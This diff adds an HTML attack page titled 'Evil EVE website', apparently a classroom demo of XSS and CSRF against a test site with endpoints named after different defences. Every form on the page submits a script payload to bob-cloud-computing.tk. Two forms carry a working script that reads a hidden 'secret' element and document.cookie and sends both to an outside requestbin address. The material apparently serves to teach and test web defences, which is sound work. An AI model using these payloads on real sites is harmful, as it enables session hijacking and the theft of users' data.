@@ -1,0 +1,100 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Evil EVE website</title>
+  </head>
+  <body>
+    <h1>This is an evil demo page</h1>
+    <a href="hidden.html">Go to a less evil looking page</a>
+
+        <h2>unsecure</h2>
+        <form method="POST" action="https://bob-cloud-computing.tk/unsecure">
+            <input type="text" style="width:100%" name="vulnerable" value="<script>function demo() {alert('XSS');} setTimeout(demo, 10)</script>"/>
+            <input type="submit" value="Submit" />
+        </form>
+
+        <h2>chrome_protect</h2>
+        <form method="POST" action="https://bob-cloud-computing.tk/chrome_protect">
+            <input type="text" style="width:100%" name="vulnerable" value="<script>function demo() {alert('XSS');} setTimeout(demo, 10)</script>"/>
+            <input type="submit" value="Submit" />
+        </form>
+
+        <h2>referer_check</h2>
+        <form method="POST" action="https://bob-cloud-computing.tk/referer_check">
+            <input type="text" style="width:100%" name="vulnerable" value="<script>function demo() {alert('XSS');} setTimeout(demo, 10)</script>"/>
+            <input type="submit" value="Submit" />
+        </form>
+
+        <h2>source_self</h2>
+        <form method="POST" action="https://bob-cloud-computing.tk/source_self">
+            <input type="text" style="width:100%" name="vulnerable" value="<script>function demo() {alert('XSS');} setTimeout(demo, 10)</script>"/>
+            <input type="submit" value="Submit" />
+        </form>
+
+        <h2>no_extract</h2>
+        <form method="POST" action="https://bob-cloud-computing.tk/no_extract">
+            <input type="text" style="width:100%" name="vulnerable" value="<script>function demo() {alert('XSS');} setTimeout(demo, 10)</script>"/>
+            <input type="submit" value="Submit" />
+        </form>
+
+        <h2>escape</h2>
+        <form method="POST" action="https://bob-cloud-computing.tk/escape">
+            <input type="text" style="width:100%" name="vulnerable" value="<script>function demo() {alert('XSS');} setTimeout(demo, 10)</script>"/>
+            <input type="submit" value="Submit" />
+        </form>
+
+        <h2>crsf</h2>
+        <form method="POST" action="https://bob-cloud-computing.tk/crsf">
+            <input type="text" style="width:100%" name="vulnerable" value="<script>function demo() {alert('XSS');} setTimeout(demo, 10)</script>"/>
+            <input type="submit" value="Submit" />
+        </form>
+
+
+
+        <h2>Try a real extraction on unsecure</h2>
+        <form method="POST" action="https://bob-cloud-computing.tk/unsecure">
+            <textarea style="width:100%; height: 15em" name="vulnerable">
+<script>
+    window.onload = function(e){
+        var element = document.getElementById("secret");
+        var secret = element.innerHTML;
+        var cookie = document.cookie;
+        var url = "https://requestbin.etnarek.com/13nfvyr1?secret=" + secret + "&cookie=" + cookie;
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open("GET", url, true);
+        xmlHttp.send();
+
+        alert("I have your secret : " + secret);
+    }
+
+</script>
+            </textarea>
+            <input type="submit" value="Submit" />
+        </form>
+
+        <h2>Try a real extraction on no_extract</h2>
+        <form method="POST" action="https://bob-cloud-computing.tk/no_extract">
+            <textarea style="width:100%; height: 15em" name="vulnerable">
+<script>
+    window.onload = function(e){
+        var element = document.getElementById("secret");
+        var secret = element.innerHTML;
+        var cookie = document.cookie;
+        var url = "https://requestbin.etnarek.com/13nfvyr1?secret=" + secret + "&cookie=" + cookie;
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open("GET", url, true);
+        xmlHttp.send();
+
+        alert("I have your secret : " + secret);
+    }
+
+</script>
+            </textarea>
+            <input type="submit" value="Submit" />
+        </form>
+
+
+  </body>
+</html>
